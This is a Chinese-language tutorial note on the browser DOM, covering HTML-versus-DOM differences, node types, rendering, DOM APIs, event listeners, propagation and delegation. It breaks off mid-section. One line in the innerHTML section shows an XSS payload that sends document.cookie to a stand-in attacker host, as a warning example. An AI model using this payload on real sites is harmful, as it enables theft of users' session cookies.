---
type: concept
domain: tech
tags: [dom, browser, javascript, typescript, react, frontend]
sources: [raw/Web Framework/React/DOM 節點觀念.md]
created: 2026-10-17
updated: 2026-10-17
---

> **一句話**：DOM（Document Object Model）是瀏覽器把 HTML 解析之後，在記憶體裡建立的**節點物件樹**，加上一套讓程式讀寫這棵樹的標準 API。畫面上看到的一切，都是這棵樹被渲染出來的結果；JavaScript 改畫面，實際上改的是這棵樹。

## 導讀

本篇預設你寫過一點 HTML、看得懂基本的 JavaScript，也常聽到「操作 DOM」、「Virtual DOM」這些詞，但說不太清楚 DOM 和 HTML 到底差在哪。讀完之後，你應該能回答五件事：DOM 是什麼、它和 HTML 原始碼為什麼不一樣、瀏覽器怎麼把它變成像素、為什麼大家都說「操作 DOM 很貴」、以及 React 這類框架和 DOM 的真正關係。

章節依「資料怎麼流動」排列：先講 DOM 為什麼存在，再講它的結構，接著是瀏覽器怎麼把它畫出來、程式怎麼改它、使用者怎麼透過事件和它互動，最後才講 React 如何在這一切之上蓋出宣告式的寫法。每一章都只依賴前面已經建立的概念。

## 一、問題的起點：HTML 只是一段文字

伺服器送給瀏覽器的 HTML，本質上只是一長串字元。瀏覽器要把它畫成畫面，就必須先「看懂」它：哪個是標題、哪個段落包在哪個區塊裡、哪個按鈕屬於哪個表單。更進一步，網頁不是靜態海報，使用者點了按鈕，清單要多一筆；輸入框打錯字，旁邊要冒出紅字提示。這些改變都得由程式來做。

如果程式只能面對那串原始文字，要「把第三個項目的文字改掉」就得去搜尋字串、數 `<li>` 出現第幾次、再做字串替換，任何一個多餘的空白或註解都會讓邏輯崩潰。程式需要的是一個**有結構、有身分**的表示法：每個元素都是一個物件，有自己的屬性、方法，也知道自己的父節點與子節點是誰。這個表示法就是 DOM。

名稱裡的 *Object Model* 正是這個意思：把「文件」（Document）建模（Model）成一群物件（Object）。它的歷史也解釋了為什麼它是一份**標準**而不是某個瀏覽器的私有功能。1990 年代後期，Netscape 與 Internet Explorer 各自發明了互不相容的頁面操作方式，同一段互動效果往往要寫兩套程式。W3C 在 1998 年發布 DOM Level 1，把「文件如何被表示成物件、可以用哪些方法操作」統一下來；今天這份規格由 WHATWG 以 DOM Living Standard 的形式持續維護。

值得注意的是，DOM 規格本身是**語言中立**的，它定義的是介面（interface），JavaScript 只是最主要的使用者。所以「DOM」和「JavaScript」是兩件事：`Array.prototype.map` 屬於 JavaScript 語言本身，`document.querySelector` 則是瀏覽器透過 DOM 提供給 JavaScript 呼叫的 API。這也是為什麼在 Node.js 裡沒有 `document`——那裡沒有瀏覽器，也就沒有 DOM。

## 二、HTML 不等於 DOM

初學者最常見的誤解，是把 DOM 當成「HTML 原始碼的另一種說法」。兩者的關係比較像**設計圖與蓋好的房子**：HTML 是起點，DOM 是瀏覽器依照它蓋出來、而且之後還會持續被改建的實體。它們會在三個地方分道揚鑣。

第一，**Parser 會修正與補完**。HTML 的解析規則非常寬容，你漏寫的 `<html>`、`<head>`、`<body>` 會被自動補上，沒關閉的 `<p>` 會被自動關閉。最經典的例子是表格：

```html
<table>
  <tr><td>A</td></tr>
</table>
```

原始碼裡沒有 `<tbody>`，但瀏覽器建出來的 DOM 是 `table > tbody > tr > td`。所以如果你寫了 CSS selector `table > tr`，它永遠不會命中——在 DOM 裡，`tr` 的父節點是 `tbody`，不是 `table`。

第二，**JavaScript 會在載入後改動它**。頁面一旦開始執行腳本，DOM 就可能被新增、刪除、修改，這些改動不會回寫到 HTML 檔案。

第三，**DOM 是 live 的執行期狀態**。HTML 檔案從伺服器送出那一刻就凍結了，DOM 則隨著使用者操作與程式邏輯不斷變化。

這個區別直接影響除錯方式：

| 做法 | 看到的是 | 適合 |
| --- | --- | --- |
| ✗ 檢視原始碼（View Source） | 伺服器送來的 HTML 字串 | 確認後端輸出了什麼 |
| ✓ DevTools 的 Elements 面板 | 此時此刻的 DOM 樹 | 確認畫面為什麼長這樣 |

當畫面和你預期的不一樣時，去讀 HTML 原始碼通常找不到答案，因為畫面是從 DOM 畫出來的，而 DOM 早已不是原始碼的樣子。

## 三、樹與節點

既然 DOM 是一棵樹，下一個問題自然是：樹上長的是什麼？答案是**節點（Node）**。不只標籤，連標籤裡的文字、甚至 HTML 註解，都各自是一個節點。

```text
document
└─ <html>
   ├─ <head>
   │  └─ <title>
   │     └─ "我的網站"（Text）
   └─ <body>
      ├─ <h1>
      │  └─ "標題"（Text）
      └─ <div>
         └─ <p>
            └─ "段落"（Text）
```

### 節點的種類

每個節點都有一個 `nodeType` 數字，告訴你它是哪一種：

| 節點類型 | `nodeType` | 說明 | 範例 |
| --- | --- | --- | --- |
| Element | 1 | HTML 標籤 | `<div>`、`<p>`、`<button>` |
| Text | 3 | 標籤內的文字，包含換行與縮排 | `<p>Hello</p>` 裡的 `Hello` |
| Comment | 8 | HTML 註解 | `<!-- note -->` |
| Document | 9 | 整份文件的根 | `document` 物件 |
| DocumentFragment | 11 | 不掛在樹上的暫存容器 | `document.createDocumentFragment()` |

至於屬性（`class="btn"`），規格裡雖然有 `Attr` 這種節點，但它**不屬於樹的一部分**——它不是任何節點的子節點，也不會出現在 `childNodes` 裡。實務上一律透過 `getAttribute` / `setAttribute` 或對應的 property 操作，幾乎不會直接碰 `Attr` 物件。

### 空白也是節點

Text 節點有一個很容易踩的細節：HTML 裡標籤之間的換行與縮排，也會變成 Text 節點。

```html
<ul>
  <li>A</li>
  <li>B</li>
</ul>
```

`<ul>` 的第一個子節點不是 `<li>A</li>`，而是 `<ul>` 和第一個 `<li>` 之間那段「換行 + 兩個空白」。因此 DOM 提供了兩套導覽 API：一套看所有節點，一套只看 Element。

| 想找 | 包含 Text / Comment | 只看 Element |
| --- | --- | --- |
| 子節點 | `childNodes` | `children` |
| 第一個子節點 | `firstChild` | `firstElementChild` |
| 最後一個子節點 | `lastChild` | `lastElementChild` |
| 下一個兄弟 | `nextSibling` | `nextElementSibling` |
| 上一個兄弟 | `previousSibling` | `previousElementSibling` |
| 父節點 | `parentNode` | `parentElement` |

```js
const ul = document.querySelector('ul')

ul.firstChild.textContent
// "\n  "，拿到的是空白 Text 節點

ul.firstElementChild.textContent
// "A"
```

除非你真的要處理文字節點，否則預設使用右欄的 Element 版本。

### 介面的繼承鏈

節點物件不是一個扁平的類別，而是一條繼承鏈。理解這條鏈，就能理解為什麼有些方法每個元素都有、有些只有 `<input>` 才有：

```text
EventTarget：能掛事件（addEventListener）
└─ Node：能存在於樹中（parentNode、childNodes、textContent）
   └─ Element：有 tag、attribute、class（classList、querySelector）
      └─ HTMLElement：有 style、hidden、focus()、click()
         └─ HTMLInputElement：有 value、checked、select()
```

這條鏈在 TypeScript 裡會直接變成型別。`document.querySelector('input')` 能從 tag 名稱推出 `HTMLInputElement | null`，但用 id 或 class 選取時 TypeScript 無從推斷，只會給你 `Element | null`，此時要自己指定：

```ts
const byTag = document.querySelector('input')
// HTMLInputElement | null

const byId = document.querySelector<HTMLInputElement>('#name')
// HTMLInputElement | null，可以安全讀 byId?.value
```

React 裡寫 `useRef<HTMLInputElement>(null)` 的那個型別，就是這條繼承鏈上的同一個介面。

## 四、從 DOM 到像素：瀏覽器的渲染流程

知道 DOM 長什麼樣之後，下一個問題是：這棵樹怎麼變成螢幕上的畫面？這段流程很重要，因為後面要談的「為什麼操作 DOM 很貴」，答案全在這裡。

```text
HTML → Parser → DOM Tree
CSS → Parser → CSSOM
DOM Tree + CSSOM → Render Tree → Layout → Paint → Composite
```

瀏覽器會同時解析 HTML 與 CSS，分別得到 DOM 與 CSSOM（CSS Object Model，CSS 規則的物件樹）。兩者合併成 **Render Tree**，只包含「真正要畫出來」的節點：`display: none` 的元素不在其中，`visibility: hidden` 的元素則仍在（它看不見但會佔位）。

接著是 **Layout**（也叫 Reflow），計算每個節點的確切位置與尺寸；然後是 **Paint**，把文字、顏色、邊框、陰影填成像素；最後的 **Composite** 把多個圖層依正確順序疊合，這一步通常交給 GPU。

### Script 會擋住 Parser

這條流程有一個關鍵的插曲：Parser 由上往下讀 HTML，一旦遇到一般的 `<script>`，就會**停下來先執行它**，因為腳本可能會修改 DOM。這帶來一個後果：放在 `<head>` 裡的腳本執行時，`<body>` 根本還沒被解析，自然找不到任何元素。

| 寫法 | 下載時 | 執行時機 | 適合 |
| --- | --- | --- | --- |
| `<script>` | 停止解析 | 下載完立刻執行 | 幾乎不再推薦 |
| `<script async>` | 不停止解析 | 下載完立刻執行，順序不保證 | 獨立的第三方腳本（統計、廣告） |
| `<script defer>` | 不停止解析 | DOM 解析完、`DOMContentLoaded` 前依序執行 | 需要操作 DOM 的應用程式腳本 |
| `<script type="module">` | 不停止解析 | 預設等同 `defer` | 現代打包工具的輸出 |

與此相關的兩個事件也常被混淆：`DOMContentLoaded` 代表 DOM 樹已經建完，可以安全地操作元素；`load` 則要等圖片、樣式表等所有資源都下載完才觸發。需要操作 DOM 時，等前者就夠了。

## 五、用 JavaScript 操作 DOM

有了樹的結構與渲染流程的概念，就可以開始動手改樹了。原生 DOM API 可以歸成六類動作：前五類是程式主動去讀寫這棵樹，最後一類方向相反，讓樹在使用者有動作時回頭通知程式。

### 選取節點

```js
const app = document.getElementById('app')
const firstItem = document.querySelector('.item')
const allItems = document.querySelectorAll('.item')
```

`querySelector` / `querySelectorAll` 接受任何 CSS selector，是現代程式的預設選擇。要注意 `querySelectorAll` 回傳的是 **NodeList** 而不是 Array：它有 `forEach`，但沒有 `map`、`filter`。需要陣列方法時先轉換：

```js
const texts = Array.from(allItems).map(el => el.textContent)
```

另一個細節是 live 與 static 的差別。`querySelectorAll` 回傳的是**當下的快照**（static），之後 DOM 怎麼變它都不會變；而 `getElementsByClassName`、`children` 回傳的 HTMLCollection 是 **live** 的，DOM 一改它就跟著變。在迴圈中一邊走訪 live collection 一邊刪除節點，會跳過元素或無窮迴圈，這是舊式程式碼常見的 bug 來源。

### 讀寫內容：textContent、innerText、innerHTML

這三個屬性看起來都在「改文字」，但行為差很多：

| 屬性 | 讀取時 | 寫入時 | 注意 |
| --- | --- | --- | --- |
| `textContent` | 所有後代文字，不管 CSS | 當成純文字 | 最快、最安全，預設選它 |
| `innerText` | 只有「看得見」的文字 | 當成純文字 | 要考慮 CSS，讀取時會觸發 Layout |
| `innerHTML` | 後代的 HTML 字串 | **當成 HTML 解析** | 會把輸入當程式碼，有 XSS 風險 |

`innerHTML` 的危險值得單獨說明。它會把字串交給 Parser 解析成節點，所以如果字串來自使用者輸入，攻擊者就能把任意 HTML 塞進你的頁面：

```js
// ✗ 使用者輸入直接當 HTML
comment.innerHTML = userInput
// userInput 若是 <img src=x onerror="fetch('https://evil.example/?c=' + document.cookie)">
// 圖片載入失敗時，onerror 裡的程式就會以你網站的身分執行

// ✓ 使用者輸入只當文字
comment.textContent = userInput
```

原則很簡單：**只有你自己寫死的字串才可以給 `innerHTML`**；任何來自外部的資料，一律用 `textContent`，或用 `createElement` 一個一個建節點。

### Attribute 與 Property

HTML 標籤上的屬性（attribute）和 DOM 物件上的屬性（property）是兩件事，大多數時候會同步，但不總是。最典型的例子是輸入框：

```js
// HTML: <input id="name" value="預設值">
// 使用者把內容改成「Vic」之後：

input.getAttribute('value')
// "預設值"，attribute 代表 HTML 寫的初始值

input.value
// "Vic"，property 代表此刻的實際狀態
```

讀寫使用者的當前輸入，一律用 property（`input.value`、`checkbox.checked`）；`getAttribute` / `setAttribute` 適合處理自訂的 `data-*` 屬性或無對應 property 的 attribute。

### 改 class 與 style

```js
el.classList.add('active')
el.classList.remove('hidden')
el.classList.toggle('open')

el.style.color = 'red'
```

兩者都能改外觀，但建議優先切換 class，把樣式留在 CSS 裡定義。直接寫 `style` 會變成 inline style，優先權最高，之後很難從 CSS 覆蓋，也讓「長什麼樣」的邏輯散落在 JavaScript 各處。

### 建立、插入、刪除

```js
const btn = document.createElement('button')
btn.textContent = '點我'

app.append(btn)
app.prepend(header)
btn.before(icon)
btn.after(hint)

btn.replaceWith(newBtn)
newBtn.remove()
```

舊程式碼常見的 `appendChild`、`removeChild`、`insertBefore` 都還能用，但需要先拿到父節點才能操作（`parent.removeChild(child)`）。上面這組較新的方法直接作用在節點本身，寫起來更直覺，也可以一次傳入多個節點或字串。

### 監聽事件：EventListener

前面五類動作有一個共同點：都是**程式主動**去改 DOM。但互動頁面還需要反方向的溝通：使用者點了按鈕、按了鍵盤、捲動了頁面，程式得知道這件事才能反應。問題是程式無從預測使用者什麼時候會動作，總不能寫一個無窮迴圈不停地問「按鈕被點了嗎？被點了嗎？」。

DOM 的解法是**登記**：你事先告訴某個節點「發生 click 時，請呼叫這個函式」，之後就不用管了，等事件真的發生時，由瀏覽器回頭呼叫你登記的函式。這種「你先登記，它之後叫你」的模式，就是 **event listener**（事件監聽器），在設計模式裡叫 Observer 模式。

一筆 listener 由三個要素組成：

```js
const button = document.querySelector('#save')

function handleClick(event) {
  console.log('按鈕被點了', event.type)
}

button.addEventListener('click', handleClick)
```

| 要素 | 本例 | 說明 |
| --- | --- | --- |
| 在哪個節點上聽 | `button` | 任何 `EventTarget` 都可以，不只 Element |
| 聽什麼事件 | `'click'` | 事件類型字串，例如 `input`、`keydown`、`submit` |
| 發生時做什麼 | `handleClick` | 一個函式，稱為 handler 或 callback |

日常用語裡 listener 和 handler 常被混用，精確地說，listener 是「登記在節點上的那一筆紀錄」，handler 是「被呼叫的那個函式」。還記得第三章的繼承鏈嗎？最上層的 `EventTarget` 就是「能掛 listener」這個能力的來源，所以不只元素，`window`、`document`、`WebSocket`、`AbortSignal` 這些不在樹上的物件也都能 `addEventListener`。

#### 傳函式本身，不要呼叫它

初學者最常犯的錯，是在登記時就把函式呼叫了：

```js
// ✗ 加了括號：handleClick 立刻執行，登記上去的是它的回傳值 undefined
button.addEventListener('click', handleClick())

// ✓ 傳函式本身，等事件發生時由瀏覽器呼叫
button.addEventListener('click', handleClick)

// ✓ 需要帶參數時，外面包一層 arrow function
button.addEventListener('click', () => save(draftId))
```

`addEventListener` 要的是「一個之後可以被呼叫的函式」，不是「呼叫後的結果」。這和 `setTimeout(fn, 1000)` 是同一個道理。

#### event 物件

瀏覽器呼叫 handler 時，會傳入一個 **event 物件**，描述這次事件的細節。不同類型的事件會帶不同的資訊：

| 屬性 / 方法 | 意義 |
| --- | --- |
| `event.type` | 事件類型，例如 `'click'` |
| `event.target` | 實際觸發事件的節點（第七章詳述） |
| `event.currentTarget` | 目前執行 handler 的節點（第七章詳述） |
| `event.key` | 鍵盤事件按下的是哪個鍵，例如 `'Enter'` |
| `event.clientX` / `event.clientY` | 滑鼠事件發生時，游標在視窗中的座標 |
| `event.preventDefault()` | 取消瀏覽器的預設行為，例如表單送出後整頁重新載入 |

```js
input.addEventListener('keydown', event => {
  if (event.key === 'Enter') submit()
})
```

#### 三種登記方式

歷史上有三種方式可以讓節點對事件作出反應，它們並不等價：

| 寫法 | 範例 | 同一事件可掛幾個 | 建議 |
| --- | --- | --- | --- |
| HTML inline attribute | `<button onclick="save()">` | 1 個 | ✗ HTML 與 JS 混在一起，只能呼叫全域函式，也會被 CSP 擋下 |
| DOM property | `button.onclick = save` | 1 個，後設定的覆蓋前面的 | 小 demo 可以 |
| `addEventListener` | `button.addEventListener('click', save)` | 多個，依登記順序執行 | ✓ 預設選擇 |

`onclick` property 的問題在於它只是一個欄位，重複賦值就會靜悄悄地蓋掉前一個：

```js
button.onclick = trackClick
button.onclick = save
// 只剩 save，trackClick 被默默蓋掉，沒有任何錯誤訊息
```

`addEventListener` 則是「再加一筆」，兩個 handler 都會執行，彼此不知道對方存在，適合多個模組各自掛自己的邏輯。順帶一提，React 的 `<button onClick={save}>` 長得像 inline attribute，但它其實是傳給 React 的 prop，React 會在 root container 用 `addEventListener` 統一處理（第八章詳述）。

#### handler 什麼時候執行

listener 登記後不會立刻執行，而是等事件發生時，由瀏覽器把「呼叫這個 handler」排進待辦佇列，輪到時才執行。JavaScript 在瀏覽器裡是單執行緒，handler 執行期間，畫面無法更新，也無法回應其他點擊。所以 handler 應該短而快；一個跑了兩秒的 click handler，會讓整個頁面卡住兩秒。

同一個節點上的同一種事件可以掛多個 listener，它們依登記順序執行。但如果**同一個函式參考**以相同設定登記兩次，瀏覽器只會保留一筆，不會執行兩次。

#### options：第三個參數

`addEventListener` 的第三個參數可以調整 listener 的行為：

| option | 作用 |
| --- | --- |
| `capture: true` | 在 Capture 階段觸發，而不是預設的 Bubble 階段（第七章詳述） |
| `once: true` | 執行一次後自動移除 |
| `passive: true` | 承諾不呼叫 `preventDefault()`，讓瀏覽器不必等 handler 就能立刻捲動 |
| `signal` | 傳入 `AbortController.signal`，呼叫 `abort()` 時自動移除 |

```js
dialog.addEventListener('close', onClose, { once: true })
```

#### 移除 listener

有登記就要有取消。`removeEventListener` 必須傳入**同一個函式參考**與相同的 `capture` 設定，傳一個長得一樣的新 arrow function 是移除不掉的：

```js
// ✗ 兩個 arrow function 是不同的物件，移除失敗
window.addEventListener('resize', () => relayout())
window.removeEventListener('resize', () => relayout())

// ✓ 用具名函式，登記與移除用同一個參考
window.addEventListener('resize', relayout)
window.removeEventListener('resize', relayout)
```

需要一次清掉多個 listener 時，用 `AbortController` 最乾淨：

```js
const controller = new AbortController()

window.addEventListener('resize', onResize, { signal: controller.signal })
window.addEventListener('scroll', onScroll, { signal: controller.signal })

controller.abort()
```

為什麼要移除？掛在元素上的 listener，元素從 DOM 移除且沒有其他地方參考它時，會跟著元素一起被回收。但掛在 `window`、`document` 這類永遠存在的物件上的 listener，只要沒移除就會一直存在。SPA 換頁時，舊頁面的元件已經消失，它掛在 `window` 上的 `resize` handler 卻還活著，每次縮放視窗都會執行，甚至去讀已經不存在的元素，這就是典型的記憶體洩漏。React 的 `useEffect` 要回傳 cleanup 函式，正是為了這件事：

```tsx
useEffect(() => {
  const onResize = () => setWidth(window.innerWidth)
  window.addEventListener('resize', onResize)
  return () => window.removeEventListener('resize', onResize)
}, [])
```

到這裡，程式已經能改 DOM，也能聽到使用者的動作。不過有兩個問題還沒回答：點擊按鈕裡的圖示時，事件到底算誰的？為什麼掛在外層容器的 listener 也會被觸發？這些屬於事件在樹上的傳遞機制，留到第七章。在那之前，先處理一個更迫切的問題：每一次改 DOM，都是有代價的。

## 六、為什麼說「操作 DOM 很貴」

「操作 DOM 很慢」幾乎是前端圈的常識，但這句話常被誤解。呼叫 `el.textContent = 'x'` 這個 JavaScript 動作本身並不慢，真正貴的是它**觸發的後續工作**：回想第四章的流程，DOM 一改，瀏覽器可能要重新跑 Layout、Paint、Composite。不同的改動，觸發的範圍不同：

| 改動 | 重新觸發 | 成本 |
| --- | --- | --- |
| 新增 / 刪除節點、改 `width`、`height`、`margin`、`font-size` | Layout → Paint → Composite | 高，可能波及整個頁面的排版 |
| 改 `color`、`background`、`box-shadow` | Paint → Composite | 中，位置沒變但要重畫 |
| 改 `transform`、`opacity` | 通常只有 Composite | 低，這也是動畫首選這兩個屬性的原因 |

瀏覽器其實很聰明，它不會每改一次就立刻重排，而是把寫入攢起來，等到下一個影格再一次處理。問題出在**讀取**：當你讀 `offsetHeight`、`offsetWidth`、`getBoundingClientRect()` 這類需要精確幾何資訊的屬性時，瀏覽器必須把攢著的改動立刻結算，強制做一次同步 Layout。如果在迴圈裡讀寫交錯，每一圈都會強迫重排一次，這叫 **Layout Thrashing**：

```js
// ✗ 每一圈都先寫入再讀取，迫使瀏覽器每圈都重排一次
for (const box of boxes) {
  box.style.width = container.offsetWidth / 2 + 'px'
}

// ✓ 先把需要的值一次讀完，再集中寫入
const half = container.offsetWidth / 2
for (const box of boxes) {
  box.style.width = half + 'px'
}
```

原則可以歸納成一句：**先集中讀，再集中寫**。需要一次插入大量節點時，先在 `DocumentFragment`（不在樹上的暫存容器）裡組好，再整個掛上去，讓真實的樹只被改動一次。

這些手動優化在小頁面上無所謂，但當畫面越來越複雜、狀態越來越多，要時時記得「哪些節點要改、怎麼改最省」就會變成沉重的負擔。這正是第八章 React 要解決的問題。不過在那之前，還有一塊拼圖：使用者怎麼和 DOM 互動。

## 七、事件：DOM 如何回應使用者

第五章已經介紹怎麼用 `addEventListener` 在節點上登記 listener。但 event 並不是只送到被點的那一個節點：使用者點擊、輸入、捲動時，瀏覽器建立的 **event 物件**會沿著 DOM 樹傳遞，經過哪個節點，那個節點上的 listener 就會被呼叫。這一章要回答的核心問題是：event「沿著樹傳遞」到底怎麼走、為什麼要這樣走，以及程式可以怎麼介入。

### 為什麼事件要在樹上傳遞

先想一個看似簡單的問題：

```html
<div class="card">
  <button>
    <span>❤</span> 收藏
  </button>
</div>
```

使用者點了愛心圖示，被點的是誰？`<span>`、`<button>`、`<div class="card">`，甚至 `<body>`，在空間上其實都被點到了：愛心在按鈕裡，按鈕在卡片裡。如果瀏覽器只通知最內層的 `<span>`，那麼幫 `<button>` 註冊的 click handler 就永遠收不到「點到按鈕裡的圖示」這件事，每個按鈕都得替自己裡面的每個子元素各綁一次 handler，顯然不合理。

所以 DOM 的設計是：event 有一個明確的**目標**（target，也就是最內層被點到的節點），但它的旅程會經過目標的所有祖先，沿路每一層都有機會處理它。這段沿路傳遞的過程叫做**事件傳遞（propagation）**。

至於「沿路的方向」，歷史上兩大瀏覽器意見相反：Netscape 主張由外往內（capture），IE 主張由內往外（bubble）。W3C 標準化時把兩種都收了進來，於是有了今天的三個階段。

### 三個階段

```text
點擊 <span>❤</span> 時：

1. Capture：window → document → html → body → div.card → button
2. Target：span（抵達目標本身）
3. Bubble：button → div.card → body → html → document → window
```

event 先從 `window` 一路往下潛到目標的父節點（Capture），抵達目標（Target），再從目標的父節點一路往上浮回 `window`（Bubble）。「冒泡」這個名字形容的就是最後這段：像水底的氣泡一層一層浮上水面。

handler 掛在哪個階段，由 `addEventListener` 的第三個參數決定：

```js
el.addEventListener('click', handler)
// 預設：Bubble 階段

el.addEventListener('click', handler, { capture: true })
// Capture 階段
```

因為預設是 Bubble，日常寫的 handler 幾乎都在冒泡階段執行，這也是大多數人只聽過「冒泡」、沒聽過「捕獲」的原因。

### 親手驗證順序

光看圖不如跑一次。把下面這段放進任何 HTML 檔，點擊按鈕後看 Console：

```html
<div id="outer">
  <div id="inner">
    <button id="btn">點我</button>
  </div>
</div>

<script>
  for (const id of ['outer', 'inner', 'btn']) {
    const el = document.getElementById(id)
    el.addEventListener('click', () => console.log('capture', id), { capture: true })
    el.addEventListener('click', () => console.log('bubble', id))
  }
</script>
```

```text
capture outer
capture inner
capture btn
bubble btn
bubble inner
bubble outer
```

Capture 由外往內，Bubble 由內往外，在目標本身轉折。就算只在 `outer` 掛一個普通的 bubble handler，點擊按鈕時它一樣會被呼叫，這就是冒泡最實際的效果：**點擊子元素，等於也點擊了它所有的祖先**。

handler 裡可以讀 `e.eventPhase` 確認目前在哪個階段：`1` 是 Capture、`2` 是 Target、`3` 是 Bubble。

### 路徑在派送前就決定了

有一個不太直覺的細節：瀏覽器在開始派送 event **之前**，就先把整條路徑（目標加上它所有的祖先）算好並固定下來。之後就算某個 handler 把目標從 DOM 移除、或搬到別處，event 仍然沿著原本那條路徑走完。這條路徑可以用 `e.composedPath()` 取得。

這解釋了一個常讓人困惑的現象：在按鈕的 click handler 裡把按鈕自己刪掉，外層容器的 click handler 依然會收到這次點擊。

### target 與 currentTarget

冒泡讓同一個 event 依序經過很多節點，於是 handler 需要分辨兩件事：「事件從哪裡來」與「我現在在哪裡」。

| 屬性 | 指向 | 在整趟傳遞中 |
| --- | --- | --- |
| `e.target` | 實際被點到的最內層節點 | 固定不變 |
| `e.currentTarget` | 目前正在執行 handler 的節點，也就是呼叫 `addEventListener` 的那個節點 | 每一站都不同 |

用開頭的卡片來看，點擊愛心時：

```js
card.addEventListener('click', e => {
  console.log(e.target)
  // <span>❤</span>

  console.log(e.currentTarget)
  // <div class="card">
})
```

最常見的錯誤，是在外層 handler 裡把 `e.target` 當成「我自己」：

```js
// ✗ 點到愛心時 e.target 是 span，span 身上沒有 data-id
button.addEventListener('click', e => {
  save(e.target.dataset.id)
})

// ✓ 要的是綁 handler 的那個 button
button.addEventListener('click', e => {
  save(e.currentTarget.dataset.id)
})
```

這個 bug 特別討厭的地方在於：點按鈕的空白處時一切正常（此時 `target` 剛好就是 button），只有點到圖示或文字時才壞掉，測試時很容易漏掉。

`currentTarget` 還有第二個陷阱：它**只在派送期間有值**。event 傳遞結束後，瀏覽器會把它設回 `null`。所以在 `await` 之後、`setTimeout` 裡讀它，拿到的都是 `null`；需要時要在 handler 一開始就先存進變數：

```js
button.addEventListener('click', async e => {
  const btn = e.currentTarget
  btn.disabled = true
  await saveDraft()
  btn.disabled = false
})
```

同樣的原因，在 handler 裡 `console.log(e)`、事後才在 Console 展開物件時，會看到 `currentTarget: null`，那不代表當下就是 `null`。

### 停止傳遞：stopPropagation 與 stopImmediatePropagation

有時你希望 event 到此為止，不要再往下一站走。DOM 提供兩個力道不同的方法：

| 方法 | 效果 |
| --- | --- |
| `e.stopPropagation()` | 不再傳到**下一個節點**，但目前節點上其他 handler 仍會執行 |
| `e.stopImmediatePropagation()` | 連目前節點上**還沒執行的其他 handler** 也一起停掉 |

```js
btn.addEventListener('click', e => {
  console.log('A')
  e.stopPropagation()
})
btn.addEventListener('click', () => console.log('B'))
outer.addEventListener('click', () => console.log('outer'))
```

點擊 `btn` 會輸出 `A`、`B`，`outer` 不會執行；若把 `stopPropagation` 換成 `stopImmediatePropagation`，就只會輸出 `A`。

另外要注意，若在 **Capture 階段**呼叫 `stopPropagation()`，event 連目標都到不了，目標本身與整個 Bubble 階段都會被跳過。這能拿來做全域攔截，但也是最難追查的 bug 來源之一。

### 為什麼不要濫用 stopPropagation

`stopPropagation` 看起來是解決「外層 handler 不該被觸發」最直接的方法，但它的代價是**切斷所有祖先對這次事件的感知**，而祖先上可能掛著你不知道的東西：下拉選單的「點外面就關閉」、分析工具的點擊追蹤、框架的事件委派。

典型的例子是 modal：點遮罩要關閉，點內容不要關閉。

```js
// ✗ 在內容上擋掉冒泡
modalContent.addEventListener('click', e => e.stopPropagation())
backdrop.addEventListener('click', closeModal)
// 副作用：modal 裡的下拉選單依賴 document 的 click 來「點外面就關閉」，現在永遠收不到

// ✓ 不擋冒泡，讓遮罩自己判斷點到的是不是遮罩本身
backdrop.addEventListener('click', e => {
  if (e.target === e.currentTarget) closeModal()
})
```

正確版本讓 event 照常冒泡，每一層自己判斷「這次點擊跟我有沒有關係」。最常用的兩個判斷式是 `e.target === e.currentTarget`（點的是我本身，不是我的子元素）與 `!el.contains(e.target)`（點在我外面）。原則是：**能用判斷解決的，就不要用阻斷解決**。

### preventDefault 與冒泡無關

`preventDefault()` 常和 `stopPropagation()` 混為一談，但它管的是另一件事：**取消瀏覽器的預設行為**，例如 `<a>` 的跳轉、`<form>` 的送出、checkbox 的勾選。

| 方法 | 管的事 | 不管的事 |
| --- | --- | --- |
| `e.stopPropagation()` | event 是否繼續傳到下一個節點 | 預設行為照常發生 |
| `e.preventDefault()` | 瀏覽器的預設行為是否發生 | event 照常冒泡 |

兩者完全獨立，想同時達成就兩個都呼叫。這裡有一個值得記住的時間點：預設行為是在**整趟傳遞結束之後**才執行的，所以路徑上任何一層都能取消它。`<a>` 包在 `<nav>` 裡時，在 `nav` 上呼叫 `preventDefault()` 一樣能阻止跳轉，SPA 的前端路由攔截連結點擊靠的正是這一點：

```js
nav.addEventListener('click', e => {
  const a = e.target.closest('a')
  if (!a) return
  e.preventDefault()
  navigate(a.getAttribute('href'))
})
```

想知道前面的 handler 是否已經取消過預設行為，可以讀 `e.defaultPrevented`。另一個例外是註冊時加了 `{ passive: true }` 的 listener，它等於承諾不會取消預設行為，瀏覽器因此能不等 handler 就立刻捲動；在這種 listener 裡呼叫 `preventDefault()` 會被忽略，Console 會出現警告。Chrome 對掛在 `window`、`document`、`body` 上的 `touchstart`、`touchmove`、`wheel` 預設就是 passive。

### 事件委派（Event Delegation）

冒泡機制帶來一個非常實用的技巧。假設清單有一千個項目，每個都要能點擊：

```js
// ✗ 每個項目各綁一個 handler：註冊一千次，且之後新增的項目沒有 handler
document.querySelectorAll('li').forEach(li => {
  li.addEventListener('click', () => select(li))
})

// ✓ 只在父節點綁一次，利用冒泡接住所有子項目的點擊
list.addEventListener('click', e => {
  const li = e.target.closest('li')
  if (li && list.contains(li)) select(li)
})
```

委派版本只註冊一個 handler，而且之後動態新增的 `<li>` 不需要任何額外處理就能運作，因為它們的點擊同樣會冒泡到 `list`。這段程式的兩個判斷各有用意：`closest('li')` 從 `e.target` 往上找最近的 `<li>`，處理「實際點到的是 `<li>` 裡面的 `<span>`」的情況，也就是前面 target 與 currentTarget 的問題；`list.contains(li)` 則防止 `closest` 往上找過頭，在巢狀清單中找到 `list` 外層的 `<li>`。

委派可以說是冒泡機制最大的回報：一個 handler 取代一千個，記憶體與註冊成本都下降，而且清單內容怎麼增刪都不必重新綁定。第八章會看到，React 的整套事件系統就建立在這個技巧上。

### 不會冒泡的事件

委派依賴冒泡，但並非所有事件都會冒泡。每個 event 物件都有 `e.bubbles` 屬性可以確認：

| 事件 | 會冒泡嗎 | 要在祖先統一處理時 |
| --- | --- | --- |
| `click`、`input`、`change`、`keydown`、`submit` | 會 | 直接委派 |
| `focus` / `blur` | 不會 | 改用會冒泡的 `focusin` / `focusout` |
| `mouseenter` / `mouseleave` | 不會 | 改用 `mouseover` / `mouseout`，再以 `relatedTarget` 過濾 |
| `<img>`、`<script>` 的 `load` / `error` | 不會 | 改在 Capture 階段監聽 |
| 元素上的 `scroll` | 不會 | 直接掛在正在捲動的那個元素上 |

表中「改在 Capture 階段監聽」背後有一個關鍵事實：**不冒泡只代表沒有 Bubble 階段，所有事件都仍然會經過 Capture 階段**。因此即使 `error` 不冒泡，也能在 `document` 用 capture 一次接住整頁所有圖片的載入失敗：

